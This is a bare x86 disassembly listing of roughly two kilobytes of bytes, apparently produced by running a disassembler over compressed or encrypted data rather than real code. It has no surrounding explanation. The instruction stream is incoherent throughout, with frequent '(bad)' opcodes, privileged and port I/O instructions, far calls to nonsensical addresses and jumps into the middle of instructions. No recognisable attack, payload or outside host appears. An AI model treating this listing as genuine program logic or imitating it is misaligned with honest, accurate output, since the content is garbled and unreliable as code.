  49374f:	inc    edi
  493750:	jmp    FWORD PTR [eax+eiz*4-0x7d]
  493754:	nop
  493755:	dec    esp
  493756:	fimul  DWORD PTR [esi-0x28a08b51]
  49375c:	div    bl
  49375e:	test   DWORD PTR ds:0xbf70683,esi
  493764:	push   es
  493765:	or     BYTE PTR [esi+0x4],0x4
  493769:	jl     0x49370c
  49376b:	test   BYTE PTR [eax-0x71398e15],0x81
  493772:	sub    ch,BYTE PTR [edx-0xa]
  493775:	pop    eax
  493776:	ins    DWORD PTR es:[edi],dx
  493777:	sub    eax,0x4372b360
  49377c:	call   DWORD PTR [edi+0x7003f5c0]
  493782:	dec    ecx
  493783:	out    0xa6,eax
  493785:	xor    ah,ch
  493787:	cmp    al,BYTE PTR [edx-0x6bdf3b3b]
  49378d:	ds push edi
  49378f:	aaa    
  493790:	xor    esi,esi
  493792:	jae    0x49375a
  493794:	inc    esi
  493795:	mov    eax,ds:0x8a673e89
  49379a:	inc    eax
  49379b:	jmp    0x4937a6
  49379d:	adc    al,0x6
  49379f:	pop    DWORD PTR [edx+0x47503e7]
  4937a5:	or     BYTE PTR [edi],ah
  4937a7:	je     0x4937d5
  4937a9:	push   ds
  4937aa:	add    dl,BYTE PTR [esi]
  4937ac:	(bad)  
  4937ad:	into   
  4937ae:	mov    dl,0x4d
  4937b0:	mov    DWORD PTR [esi],0x940a8456
  4937b6:	sbb    ch,BYTE PTR [esi-0x4db2c38e]
  4937bc:	cmp    BYTE PTR [edi+edi*8-0x3f6f1f19],bh
  4937c3:	les    esi,FWORD PTR ds:0xecc90d60
  4937c9:	idiv   BYTE PTR [esp+ebx*2+0x57359c31]
  4937d0:	sbb    al,0x78
  4937d2:	pop    ecx
  4937d3:	cmp    esi,DWORD PTR [ebx+0x51]
  4937d6:	add    al,0xa8
  4937d8:	sbb    al,0x9
  4937da:	jae    0x493818
  4937dc:	loopne 0x493761
  4937de:	pop    es
  4937df:	das    
  4937e0:	xchg   BYTE PTR [ecx*4-0x7c53f069],bh
  4937e7:	cmp    al,0xe
  4937e9:	sbb    DWORD PTR [edx+0x2d],ecx
  4937ec:	adc    al,0xde
  4937ee:	xor    eax,0xb56b6afb
  4937f3:	cmc    
  4937f4:	aam    0x75
  4937f6:	push   ds
  4937f7:	sub    BYTE PTR [eax+edx*1+0x14],dh
  4937fb:	imul   ebp,DWORD PTR [esi+0x2],0xfffffffc
  4937ff:	dec    eax
  493800:	jne    0x493815
  493802:	push   ebx
  493803:	push   0xfffffff4
  493805:	loopne 0x49380f
  493807:	cmc    
  493808:	jmp    0x49380d
  49380a:	not    al
  49380c:	dec    ebp
  49380d:	call   0x14e18618
  493812:	sbb    al,0xba
  493814:	pop    ebx
  493815:	rol    DWORD PTR [edi+0x26],1
  493818:	(bad)  
  493819:	jmp    0x493831
  49381b:	xlat   BYTE PTR ds:[ebx]
  49381c:	or     DWORD PTR [esi-0x74ffdf7d],eax
  493822:	or     BYTE PTR [esi],0x10
  493825:	add    cl,cl
  493827:	fild   DWORD PTR [esi]
  493829:	pop    esp
  49382a:	call   0x5b7c:0xcb3bfcbf
  493831:	cmp    ecx,DWORD PTR ds:0xc1c18b53
  493837:	clc    
  493838:	icebp  
  493839:	test   eax,ebp
  49383b:	rol    al,0xb9
  49383e:	pop    es
  49383f:	inc    ebp
  493840:	jl     0x493843
  493842:	shl    DWORD PTR [eax+0x4c303c70],1
  493848:	xor    BYTE PTR [ecx],dl
  49384a:	sbb    eax,0x5ffcb2b
  49384f:	rcl    BYTE PTR [edx+ecx*1],cl
  493852:	dec    ecx
  493853:	dec    ecx
  493854:	or     DWORD PTR [esi+eax*1],0xffffffff
  493858:	xor    eax,eax
  49385a:	jmp    0x49385d
  49385c:	sbb    al,0x1c
  49385e:	xchg   edx,eax
  49385f:	adc    eax,0x4091889
  493864:	xchg   DWORD PTR [edx-0x66],edx
  493867:	arpl   WORD PTR [esi],cx
  493869:	sbb    BYTE PTR [ebx+0x7],al
  49386c:	dec    ebx
  49386d:	imul   ebp,DWORD PTR ds:0x2742795d,0x891dab1
  493877:	jb     0x493893
  493879:	inc    edi
  49387a:	or     edx,DWORD PTR [edx]
  49387c:	js     0x493816
  49387e:	loope  0x493855
  493880:	ja     0x49388e
  493882:	ins    DWORD PTR es:[edi],dx
  493883:	mov    ah,0xf4
  493885:	adc    al,0x7c
  493887:	stc    
  493888:	data16 or ch,cl
  49388b:	mov    ch,0xb1
  49388d:	aaa    
  49388e:	loope  0x49383e
  493890:	cdq    
  493891:	sbb    dl,dl
  493893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  493894:	jmp    0x7dc23191
  493899:	or     cl,ch
  49389b:	std    
  49389c:	repz jmp 0x5ec8:0x49127226
  4938a4:	loop   0x493853
  4938a6:	fwait
  4938a7:	sub    BYTE PTR [ebp+esi*1+0x35],cl
  4938ab:	push   ds
  4938ac:	sbb    DWORD PTR [esp+ebx*8],ebp
  4938af:	les    esp,FWORD PTR [ebx+0x180375e9]
  4938b5:	out    dx,al
  4938b6:	js     0x493893
  4938b8:	inc    edi
  4938b9:	dec    ecx
  4938ba:	jg     0x49385a
  4938bc:	call   0x1dbd5afa
  4938c1:	mov    bh,0x80
  4938c3:	icebp  
  4938c4:	push   ss
  4938c5:	add    edi,DWORD PTR [ebx]
  4938c7:	mov    bl,0xe1
  4938c9:	es dec esi
  4938cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4938cc:	call   0x84925d40
  4938d1:	outs   dx,BYTE PTR ds:[esi]
  4938d2:	bound  esp,QWORD PTR [eax-0x34]
  4938d5:	or     al,0x53
  4938d7:	or     eax,0x88103052
  4938dc:	je     0x49386d
  4938de:	mov    BYTE PTR ds:0x76a54e04,al
  4938e4:	add    DWORD PTR [eax],ebp
  4938e6:	stos   BYTE PTR es:[edi],al
  4938e7:	sbb    BYTE PTR [edx+edx*1-0x48],bh
  4938eb:	in     al,0x68
  4938ed:	cmp    dl,dl
  4938ef:	jmp    DWORD PTR [eax+0xb]
  4938f2:	fidivr WORD PTR [ecx-0x145cb23a]
  4938f8:	mov    al,ds:0x813f27a2
  4938fd:	mov    eax,0xffa04980
  493902:	inc    eax
  493903:	pshufw mm0,QWORD PTR [ecx],0xb7
  493907:	xlat   BYTE PTR ds:[ebx]
  493908:	lea    edi,[ebx]
  49390a:	push   ebp
  49390b:	xor    al,0xbd
  49390d:	lods   eax,DWORD PTR ds:[esi]
  49390e:	cld    
  49390f:	mov    ecx,0x6f413eb
  493914:	jg     0x4938f6
  493916:	inc    edx
  493917:	and    eax,DWORD PTR ds:0xf5543d30
  49391d:	(bad)  
  49391e:	lock mov esi,0x185c5a96
  493924:	pop    edx
  493925:	leave  
  493926:	test   al,0xb6
  493928:	pop    ebx
  493929:	outs   dx,DWORD PTR ds:[esi]
  49392a:	cmp    BYTE PTR ds:0x4143be1a,cl
  493930:	pop    esp
  493931:	inc    ebx
  493932:	adc    ah,BYTE PTR [edi]
  493934:	sbb    edx,DWORD PTR ds:0x99a1342d
  49393a:	add    eax,0xe046e0dc
  49393f:	fwait
  493940:	loopne 0x4939a9
  493942:	int    0x60
  493944:	lahf   
  493945:	jmp    0x5e8d:0x17522e83
  49394c:	or     al,0x53
  49394e:	in     al,dx
  49394f:	jp     0x49392f
  493951:	out    dx,eax
  493952:	out    dx,eax
  493953:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493954:	je     0x493971
  493956:	sbb    BYTE PTR [eax],ch
  493958:	sbb    DWORD PTR [eax-0x39027c15],0x60
  49395f:	das    
  493960:	xor    dh,bh
  493962:	add    esp,DWORD PTR [ecx-0x1a]
  493965:	(bad)  
  493966:	lock add al,0x45
  493969:	ret    0xbc4c
  49396c:	sub    ecx,DWORD PTR [edi-0x3f]
  49396f:	inc    BYTE PTR [esi]
  493971:	or     ah,BYTE PTR [esi-0x70]
  493974:	(bad)  
  493975:	cwde   
  493976:	loopne 0x49397d
  493978:	add    esi,eax
  49397a:	push   0x29780540
  49397f:	push   ebp
  493980:	mov    edx,0x4c9f8879
  493985:	fwait
  493986:	lock jnp 0x4939f8
  493989:	push   0x8d61747d
  49398e:	or     al,0x63
  493990:	mov    DWORD PTR [ecx],eax
  493992:	cmp    eax,0xb30bf060
  493997:	mov    edx,DWORD PTR [ecx]
  493999:	add    edx,0x8017daa6
  49399f:	add    eax,0x4daadb6
  4939a4:	in     al,0x8
  4939a6:	dec    DWORD PTR [eax*1+0x4c39c0a]
  4939ad:	mov    ch,BYTE PTR [edi-0x7a]
  4939b0:	push   0x6c3eddeb
  4939b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4939b6:	push   edi
  4939b7:	sbb    al,0x18
  4939b9:	cwde   
  4939ba:	adc    ecx,edi
  4939bc:	scas   eax,DWORD PTR es:[edi]
  4939bd:	pop    edi
  4939be:	mov    BYTE PTR [ecx+0x711e87ca],0x57
  4939c5:	stos   BYTE PTR es:[edi],al
  4939c6:	sahf   
  4939c7:	push   edx
  4939c8:	add    al,0x28
  4939ca:	mov    WORD PTR [edi],es
  4939cc:	xchg   ebx,eax
  4939cd:	sti    
  4939ce:	mov    al,ds:0x862ed3a8
  4939d3:	xor    esp,esp
  4939d5:	or     ebp,esp
  4939d7:	in     al,0x1a
  4939d9:	add    BYTE PTR [eax+esi*2],al
  4939dc:	inc    ebp
  4939dd:	pop    edx
  4939de:	dec    ecx
  4939df:	or     al,0xf9
  4939e1:	cs sub bh,0xe1
  4939e5:	test   DWORD PTR [eiz*8+0x300b3818],esi
  4939ec:	inc    ebp
  4939ed:	loopne 0x493a3b
  4939ef:	clc    
  4939f0:	cmp    DWORD PTR [ebp+0x10],edi
  4939f3:	fwait
  4939f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4939f5:	mov    al,ds:0x54cd4054
  4939fa:	cmp    BYTE PTR [edi],bl
  4939fc:	aaa    
  4939fd:	cmp    BYTE PTR [ecx-0x43f2d20b],al
  493a03:	inc    ebp
  493a04:	dec    ebx
  493a05:	mov    edi,esi
  493a07:	push   ebx
  493a08:	lea    ebx,[edi+ebx*8]
  493a0b:	push   DWORD PTR [ebx+0x4c]
  493a0e:	sub    eax,0x4c8ac703
  493a13:	cmp    BYTE PTR [edx+eax*1],ah
  493a16:	leave  
  493a17:	sar    cl,1
  493a19:	mov    DWORD PTR [ebp-0x727759dc],ebx
  493a1f:	rcl    BYTE PTR [esi],0x18
  493a22:	mov    eax,0x74e60a3f
  493a27:	add    eax,0x7e032a08
  493a2c:	add    dh,cl
  493a2e:	dec    ebp
  493a2f:	adc    bh,dh
  493a31:	sar    eax,1
  493a33:	push   esi
  493a34:	test   eax,0x734c5b1b
  493a39:	mov    ebp,0x61bf8eb7
  493a3e:	mov    BYTE PTR [esp+edx*2-0x81ffbc8],dh
  493a45:	push   esi
  493a46:	(bad)
  493a4a:	loopne 0x493a40
  493a4c:	nop
  493a4d:	push   esi
  493a4e:	retf   
  493a4f:	mov    bh,0x6b
  493a51:	jmp    0x493a54
  493a53:	call   0x4c4c54f1
  493a58:	pop    es
  493a59:	add    al,0x80
  493a5b:	(bad)  
  493a5c:	inc    esp
  493a5d:	(bad)  
  493a5e:	imul   ebx,DWORD PTR [eax],0xc46c398c
  493a64:	adc    eax,0x48e80502
  493a69:	call   0x6b75:0xc2abea20
  493a70:	mov    al,0x50
  493a72:	inc    esi
  493a73:	push   DWORD PTR [edi+eax*1]
  493a76:	jp     0x493a46
  493a78:	mov    al,ds:0x7823b8cb
  493a7d:	ret    
  493a7e:	inc    esi
  493a7f:	pusha  
  493a80:	pop    edx
  493a81:	scas   al,BYTE PTR es:[edi]
  493a82:	ror    DWORD PTR [esi],cl
  493a84:	push   ss
  493a85:	(bad)  
  493a86:	or     al,0x38
  493a88:	xor    eax,0x6642501e
  493a8d:	js     0x493a9e
  493a8f:	xchg   ebp,eax
  493a90:	pushf  
  493a91:	popf   
  493a92:	and    eax,0x190e0e79
  493a97:	das    
  493a98:	and    al,0x9c
  493a9a:	sub    al,0x9c
  493a9c:	xchg   BYTE PTR [ebx],ah
  493a9e:	and    al,0xc3
  493aa0:	jge    0x493a3c
  493aa2:	push   ss
  493aa3:	sbb    al,0x40
  493aa5:	mov    al,BYTE PTR [ebp-0x4c043e97]
  493aab:	je     0x493a33
  493aad:	addr16 push 0xb
  493ab0:	mov    esi,DWORD PTR [ebp-0x5a47a6dc]
  493ab6:	mov    edi,esp
  493ab8:	pop    ecx
  493ab9:	or     bl,ah
  493abb:	fs sbb al,0x8b
  493abe:	call   0x686138ec
  493ac3:	cmp    DWORD PTR [eax-0x80],0x15
  493ac7:	mov    dl,BYTE PTR [eax+0x34]
  493aca:	mov    BYTE PTR [ebp-0xc],dl
  493acd:	mov    BYTE PTR [ebp-0xb],cl
  493ad0:	into   
  493ad1:	loopne 0x493af2
  493ad3:	or     eax,0x20981c81
  493ad8:	jmp    0x493b25
  493ada:	movsx  eax,cl
  493add:	pop    esp
  493ade:	imul   esp,DWORD PTR [eax+0x3],0x31
  493ae2:	in     eax,0x59
  493ae4:	adc    DWORD PTR [ebp+0x56653ae7],ecx
  493aea:	add    DWORD PTR [eax+0x3],esi
  493aed:	jbe    0x493b35
  493aef:	enter  0x6053,0x6b
  493af3:	retf   
  493af4:	fmul   DWORD PTR [esi+edx*2-0x7c]
  493af8:	inc    esp
  493af9:	sub    DWORD PTR ds:0x8353d474,eax
  493aff:	push   ecx
  493b00:	add    DWORD PTR [ecx],0x1f
  493b03:	lods   al,BYTE PTR ds:[esi]
  493b04:	les    eax,FWORD PTR [edx+edx*4+0x11ff4372]
  493b0b:	jmp    0x493b28
  493b0d:	pushf  
  493b0e:	mov    DWORD PTR [ebp+0x6e],esp
  493b11:	adc    al,0x49
  493b13:	inc    edi
  493b14:	outs   dx,BYTE PTR ds:[esi]
  493b15:	sbb    BYTE PTR [eax+0x6a464c7a],dl
  493b1b:	add    eax,0xae8138fa
  493b20:	pop    ecx
  493b21:	mov    WORD PTR [ebp-0x4795aeb9],cs
  493b27:	xchg   BYTE PTR [ecx+0x1b7bad19],dh
  493b2d:	jbe    0x493b7f
  493b2f:	inc    eax
  493b30:	(bad)  
  493b31:	icebp  
  493b32:	(bad)  
  493b33:	enter  0x4194,0x43
  493b37:	inc    ebx
  493b38:	xchg   ebp,eax
  493b39:	sub    al,0x56
  493b3b:	int    0x85
  493b3d:	test   eax,0xb0e24f87
  493b42:	mov    eax,DWORD PTR [eax]
  493b44:	je     0x493b69
  493b46:	jecxz  0x493bc4
  493b48:	sub    BYTE PTR [eax+0x67],bh
  493b4b:	or     al,BYTE PTR [ecx+edi*2]
  493b4e:	xor    BYTE PTR fs:[eax+0x3],al
  493b52:	rol    DWORD PTR [eax-0x7d],0xae
  493b56:	sar    BYTE PTR [eax],cl
  493b58:	mov    ch,0x70
  493b5a:	shl    dh,1
  493b5c:	dec    ebx
  493b5d:	mov    dh,0x6
  493b5f:	xlat   BYTE PTR ds:[ebx]
  493b60:	fdivr  DWORD PTR [ebp-0x3259ff01]
  493b66:	add    BYTE PTR [edi],al
  493b68:	imul   edx,edi,0x6
  493b6b:	push   es
  493b6c:	test   eax,0xb10d16c6
  493b71:	mov    cl,0x29
  493b73:	cmp    BYTE PTR [ebp+0x153717b],ch
  493b79:	mov    dh,BYTE PTR [eax-0x3fa2cfbc]
  493b7f:	pop    ds
  493b80:	dec    edi
  493b81:	mov    ebx,0x3c02a41a
  493b86:	(bad)  
  493b87:	cmp    al,0xb0
  493b89:	je     0x493bcb
  493b8b:	jecxz  0x493b8f
  493b8d:	jne    0x493bb0
  493b8f:	push   esp
  493b90:	leave  
  493b91:	pusha  
  493b92:	and    eax,0xb0b6f141
  493b97:	push   eax
  493b98:	jnp    0x493c0d
  493b9a:	sbb    edi,esp
  493b9c:	sbb    DWORD PTR [edx],eax
  493b9e:	mov    DWORD PTR [ebp-0xc727641],esi
  493ba4:	push   ecx
  493ba5:	push   edx
  493ba6:	jmp    DWORD PTR [edi]
  493ba8:	inc    ebp
  493ba9:	cmp    eax,0x11f4d1fc
  493bae:	in     al,dx
  493baf:	pop    ecx
  493bb0:	cmp    cx,WORD PTR [ecx-0xc]
  493bb4:	or     bh,0x29
  493bb7:	push   ds
  493bb8:	iret   
  493bb9:	test   eax,0x29744f02
  493bbe:	jae    0x493bf5
  493bc0:	inc    ecx
  493bc1:	add    DWORD PTR [eax+edx*2],ecx
  493bc4:	mov    WORD PTR [ecx+0x1c],ds
  493bc7:	xlat   BYTE PTR ds:[ebx]
  493bc8:	lods   al,BYTE PTR ds:[esi]
  493bc9:	add    al,0xcb
  493bcb:	call   FWORD PTR [ebx]
  493bcd:	sbb    bh,BYTE PTR [ecx]
  493bcf:	fucomip st,st(4)
  493bd1:	sbb    ebx,DWORD PTR [ecx-0x67df00f]
  493bd7:	lods   al,BYTE PTR ds:[esi]
  493bd8:	dec    ecx
  493bd9:	push   ds
  493bda:	mov    ecx,DWORD PTR [esi]
  493bdc:	mov    dl,BYTE PTR [ebx]
  493bde:	inc    edi
  493bdf:	and    eax,ecx
  493be1:	jnp    0x493bde
  493be3:	mov    BYTE PTR [edi+ecx*1+0x34],dl
  493be7:	sbb    cl,BYTE PTR [ecx+0x31380f44]
  493bed:	dec    eax
  493bee:	xor    eax,0x4aa8a5c7
  493bf3:	cmp    BYTE PTR [ecx-0x7898425e],ah
  493bf9:	int    0xc
  493bfb:	cmp    BYTE PTR [ebp+esi*4-0xe2cdd58],0x46
  493c03:	iret   
  493c04:	(bad)  
  493c05:	mov    dh,0x4d
  493c07:	std    
  493c08:	xchg   ebx,eax
  493c09:	retf   
  493c0a:	xor    esi,esi
  493c0c:	sub    ebp,DWORD PTR [ebp-0x65]
  493c0f:	xlat   BYTE PTR ds:[ebx]
  493c10:	lock adc DWORD PTR [eax+ecx*2+0x30],esp
  493c15:	cmp    esi,DWORD PTR [ebx+0x26]
  493c18:	mov    eax,0xc13a4143
  493c1d:	mov    bh,0x30
  493c1f:	mov    BYTE PTR [ecx-0x80],ch
  493c22:	cli    
  493c23:	or     dh,BYTE PTR [ebp+0xb]
  493c26:	shufps xmm0,XMMWORD PTR [eax],0x43
  493c2a:	adc    eax,0x526c9894
  493c2f:	inc    esi
  493c30:	sub    DWORD PTR [esi],esi
  493c32:	pop    edx
  493c33:	push   es
  493c34:	push   esp
  493c35:	es jb  0x493c0d
  493c38:	xchg   dl,ah
  493c3a:	inc    ebp
  493c3b:	pop    edx
  493c3c:	pushf  
  493c3d:	gs sub esi,eax
  493c40:	xchg   DWORD PTR [eax],ebp
  493c42:	and    ebx,DWORD PTR [esp+edi*2]
  493c45:	outs   dx,BYTE PTR ds:[esi]
  493c46:	or     BYTE PTR [ebp+0x14fdd43],0x75
  493c4d:	mov    esi,0xcc61ab76
  493c52:	mov    WORD PTR [ebx],?
  493c54:	daa    
  493c55:	ret    
  493c56:	sub    esp,DWORD PTR [ecx]
  493c58:	xor    BYTE PTR [ecx+0x60],bl
  493c5b:	and    al,0x94
  493c5d:	les    ebp,FWORD PTR [edi+edi*8-0x3e]
  493c61:	test   BYTE PTR [esp+ecx*2],dl
  493c64:	jne    0x493c68
  493c66:	push   0x60948cd
  493c6b:	push   cs
  493c6c:	pop    edi
  493c6d:	xor    al,0xa5
  493c6f:	pop    ds
  493c70:	jbe    0x493ce5
  493c72:	dec    ecx
  493c73:	xor    al,bh
  493c75:	inc    esi
  493c76:	fs in  eax,dx
  493c78:	pop    esi
  493c79:	jns    0x493c6d
  493c7b:	xor    eax,ecx
  493c7d:	ja     0x493c45
  493c7f:	adc    eax,DWORD PTR [ebx]
  493c81:	fiadd  WORD PTR [ebx]
  493c83:	into   
  493c84:	jg     0x493c09
  493c86:	sbb    al,BYTE PTR [ecx]
  493c88:	mov    ch,0x4f
  493c8a:	add    DWORD PTR [edx-0x7d],ebp
  493c8d:	loopne 0x493cea
  493c8f:	data16 cli 
  493c91:	sub    eax,0xd9cc802d
  493c96:	add    eax,esi
  493c98:	test   DWORD PTR es:[ebx],ecx
  493c9b:	pop    es
  493c9c:	add    DWORD PTR [ebx+0x21],0x15bdba0d
  493ca3:	(bad)  
  493ca4:	mov    bl,0xb8
  493ca6:	imul   ecx,eax,0x1929c85
  493cac:	popa   
  493cad:	add    DWORD PTR [edi-0x46],eax
  493cb0:	out    0xaa,eax
  493cb2:	aaa    
  493cb3:	mov    esp,DWORD PTR [edi]
  493cb5:	(bad)  
  493cb6:	dec    ebp
  493cb7:	jne    0x493d0e
  493cb9:	lea    edx,[ebx+0x1de0582b]
  493cbf:	mov    cl,0xad
  493cc1:	stc    
  493cc2:	loopne 0x493c6c
  493cc4:	dec    eax
  493cc5:	out    dx,al
  493cc6:	cmp    ecx,DWORD PTR [ebx+0x1e64195]
  493ccc:	jmp    0x493d12
  493cce:	nop
  493ccf:	mov    al,ds:0xeb5c081
  493cd4:	test   eax,0xc219bc9d
  493cd9:	jns    0x493c83
  493cdb:	push   es
  493cdc:	not    BYTE PTR [esi+0x56]
  493cdf:	push   0xcab3b355
  493ce4:	fs pop esp
  493ce6:	and    al,dh
  493ce8:	jmp    0x493cf6
  493cea:	lods   eax,DWORD PTR ds:[esi]
  493ceb:	adc    BYTE PTR [eax-0x6d],0xb0
  493cef:	sub    eax,ecx
  493cf1:	fcmovbe st,st(1)
  493cf3:	aad    0x5b
  493cf5:	xor    dl,BYTE PTR [edi-0x39c5d98e]
  493cfb:	xor    eax,ecx
  493cfd:	xchg   ecx,eax
  493cfe:	add    eax,0xde3bd87c
  493d03:	(bad)  
  493d05:	pusha  
  493d06:	mov    eax,0xc68c183f
  493d0b:	push   eax
  493d0c:	lea    eax,[ebp+esi*1+0x737a0178]
  493d13:	or     esi,DWORD PTR [eax]
  493d15:	mov    al,ds:0x7051b503
  493d1a:	jg     0x493ce7
  493d1c:	jmp    0x493d2a
  493d1e:	rcl    DWORD PTR [edi-0x4a7cbf18],0x22
  493d25:	pop    esp
  493d26:	mov    edx,ecx
  493d28:	stc    
  493d29:	nop
  493d2a:	sub    al,bl
  493d2c:	adc    DWORD PTR [edi+0x1d],ebp
  493d2f:	or     eax,DWORD PTR [ebx]
  493d31:	or     DWORD PTR [esi-0x10],ebp
  493d34:	jmp    0x493d75
  493d36:	push   ss
  493d37:	jae    0x493d8f
  493d39:	loope  0x493ccb
  493d3b:	out    0x4c,al
  493d3d:	jb     0x493d82
  493d3f:	lods   al,BYTE PTR ds:[esi]
  493d40:	cmp    BYTE PTR ds:0xe1dd6589,dl
  493d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493d47:	sub    BYTE PTR [ebp+0x2ebf7700],dl
  493d4d:	dec    ebp
  493d4e:	sub    ecx,DWORD PTR [ebp-0x66]
  493d51:	cmp    BYTE PTR [ebp+0x6c],dh
  493d54:	lods   al,BYTE PTR ds:[esi]
  493d55:	inc    esp
  493d56:	sub    eax,0xbb57c468
  493d5b:	neg    BYTE PTR [esi+0x39]
  493d5e:	add    eax,0x3d71475
  493d63:	add    ch,BYTE PTR [ebx+0x3dde306c]
  493d69:	pop    edi
  493d6a:	loop   0x493d77
  493d6c:	test   BYTE PTR [eax-0x15],ah
  493d6f:	xor    DWORD PTR [edi+0xf744098],edx
  493d75:	dec    esi
  493d76:	je     0x493d7a
  493d78:	sahf   
  493d79:	xor    DWORD PTR [eax+0x247b1a38],eax
  493d7f:	arpl   WORD PTR [ecx],bp
  493d81:	adc    BYTE PTR [esp+eiz*2],cl
  493d84:	sbb    al,0x0
  493d86:	mov    al,ds:0xd0879138
  493d8b:	jae    0x493dbd
  493d8d:	pop    ebx
  493d8e:	mov    ebp,0x2793085e
  493d93:	or     dh,al
  493d95:	shl    BYTE PTR [ecx],cl
  493d97:	mov    al,ds:0x1b4b27c4
  493d9c:	xchg   edi,eax
  493d9d:	dec    edx
  493d9e:	cmp    al,0x41
  493da0:	clc    
  493da1:	adc    ch,BYTE PTR [eax+0x449d6771]
  493da7:	adc    eax,DWORD PTR [ecx+ecx*4+0x119781d2]
  493dae:	dec    edx
  493daf:	leave  
  493db0:	(bad)  
  493db1:	dec    ecx
  493db2:	xor    esp,DWORD PTR [esi-0x4]
  493db5:	inc    esp
  493db6:	pusha  
  493db7:	mov    al,ds:0x17eb3db1
  493dbc:	add    ebx,DWORD PTR [eax+ebx*4]
  493dbf:	and    BYTE PTR [ecx+ebx*4+0x2b4d7aa8],ch
  493dc6:	loop   0x493d5d
  493dc8:	test   BYTE PTR [ecx+0x9],0x79
  493dcc:	and    al,0x5c
  493dce:	push   eax
  493dcf:	mov    ?,edi
  493dd1:	dec    DWORD PTR [ecx+0x4]
  493dd4:	js     0x493de1
  493dd6:	mov    edx,DWORD PTR [ecx]
  493dd8:	mov    BYTE PTR [edx],al
  493dda:	aam    0xde
  493ddc:	or     al,0x1d
  493dde:	adc    BYTE PTR [edx],bl
  493de0:	and    DWORD PTR [ecx+edx*2],ebx
  493de3:	jns    0x493e0f
  493de5:	loop   0x493d9a
  493de7:	sub    DWORD PTR [edi+0x6],0x550c9d1c
  493dee:	adc    DWORD PTR [ebx],ebx
  493df0:	xor    BYTE PTR ds:[ebx+ebp*1+0x62],dl
  493df5:	adc    BYTE PTR gs:[eax],bl
  493df8:	xchg   esp,eax
  493df9:	inc    ebp
  493dfa:	mov    ah,0x62
  493dfc:	in     al,dx
  493dfd:	inc    DWORD PTR [edx-0x73c10101]
  493e03:	push   cs
  493e04:	mov    ah,0x22
  493e06:	fidiv  WORD PTR [esi+0x12]
  493e09:	(bad)  
  493e0b:	mov    al,0x3f
  493e0d:	sub    edx,DWORD PTR [ecx]
  493e0f:	aad    0x9a
  493e11:	test   al,0xd7
  493e13:	xchg   ebp,eax
  493e14:	sbb    BYTE PTR [eax],0xf7
  493e17:	sbb    ch,BYTE PTR [edx]
  493e19:	inc    edx
  493e1a:	xor    DWORD PTR [eax+0x11],edi
  493e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493e1e:	mov    ecx,0x5919a6ec
  493e23:	in     al,0xb
  493e25:	test   DWORD PTR [eax+esi*8+0x72e5cb97],esi
  493e2c:	enter  0xcce8,0xbc
  493e30:	les    esp,FWORD PTR [ebx+edi*1+0x11fd88a8]
  493e37:	xchg   esp,eax
  493e38:	push   ds
  493e39:	repz sub BYTE PTR [eax],dl
  493e3c:	call   0xf8fd:0xb0372b32
  493e43:	and    eax,0xac0a08af
  493e48:	std    
  493e49:	mov    ah,0xef
  493e4b:	test   BYTE PTR [esi+0x48],0x5c
  493e4f:	jbe    0x493e91
  493e51:	jbe    0x493eb1
  493e53:	push   esi
  493e54:	mov    edx,0xe101d3ff
  493e59:	dec    esp
  493e5a:	or     eax,0x8b1fe183
  493e60:	lock sar esi,0x5
  493e64:	invd   
  493e66:	push   edi
  493e67:	sub    dh,BYTE PTR [ebp+0x7bca8b02]
  493e6d:	and    BYTE PTR [ebx+eiz*2],bh
  493e70:	dec    ecx
  493e71:	fwait
  493e72:	add    eax,0x3b7c203f
  493e77:	jnp    0x493ec4
  493e79:	ret    0xf74
  493e7c:	test   edi,edx
  493e7e:	xor    al,0x2c
  493e80:	test   eax,0x6716db71
  493e85:	xchg   edi,eax
  493e86:	test   BYTE PTR ds:0x138a127d,0x47
  493e8d:	or     bl,al
  493e8f:	mov    eax,0x3f3a137e
  493e94:	mov    BYTE PTR [ebp+0xa8e90ef],dl
  493e9a:	xchg   BYTE PTR [edx],cl
  493e9c:	sub    DWORD PTR ds:0xa99d1076,edx
  493ea2:	and    cl,dh
  493ea4:	hlt    
  493ea5:	push   ss
  493ea6:	cmp    dl,BYTE PTR [eax-0x30]
  493ea9:	jns    0x493eee
  493eab:	repnz mov bh,al
  493eae:	inc    edx
  493eaf:	loopne 0x493eed
  493eb1:	int3   
  493eb2:	mov    esi,0xd20fc1c2
  493eb7:	cld    
  493eb8:	and    BYTE PTR [ecx-0x77],bl
  493ebb:	test   DWORD PTR [ebp+edi*8+0x41c503c1],ecx
  493ec2:	xchg   DWORD PTR [esi-0x58ff7bc3],eax
  493ec8:	stos   BYTE PTR es:[edi],al
  493ec9:	pushf  
  493eca:	mov    dh,0x88
  493ecc:	ret    
  493ecd:	mov    al,0x5c
  493ecf:	fistp  QWORD PTR cs:[ebx+ecx*1+0x51f0ccc8]
  493ed7:	adc    edi,esi
  493ed9:	loope  0x493e6d
  493edb:	pop    ds
  493edc:	mov    cl,0xc6
  493ede:	leave  
  493edf:	mov    ebp,0x4839194e
  493ee4:	dec    eax
  493ee5:	retf   0x85f
  493ee8:	push   ebp
  493ee9:	mov    al,0x5c
  493eeb:	cs cdq 
  493eed:	pop    ss
  493eee:	add    al,0x1
  493ef0:	add    esp,0x8825b5cb
  493ef6:	xor    eax,0xbefa8002
  493efb:	inc    ecx
  493efc:	in     al,0x55
  493efe:	leave  
  493eff:	in     al,0xfd
  493f01:	pop    ss
  493f02:	cmp    edi,esi
  493f04:	jge    0x8b17bb76
  493f0a:	fdivr  DWORD PTR [ebx-0x749ed637]
  493f10:	ins    BYTE PTR es:[edi],dx
  493f11:	jns    0x493f58
  493f13:	pop    esp
  493f14:	mul    DWORD PTR [edx]
  493f16:	mov    esi,0xdf2135ca
  493f1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493f1c:	pusha  
  493f1d:	push   0xed26ade8
  493f22:	ret    
  493f23:	jb     0x493f57
  493f25:	call   0xa0f4453f
  493f2a:	mov    eax,ds:0xc85b5f6e
  493f2f:	call   0x55bd88bf
  493f34:	or     BYTE PTR [eax+0x74],ch
  493f37:	inc    esp
  493f38:	xchg   ebp,eax
  493f39:	adc    ax,0xbe61
  493f3d:	cmp    dl,0xd6
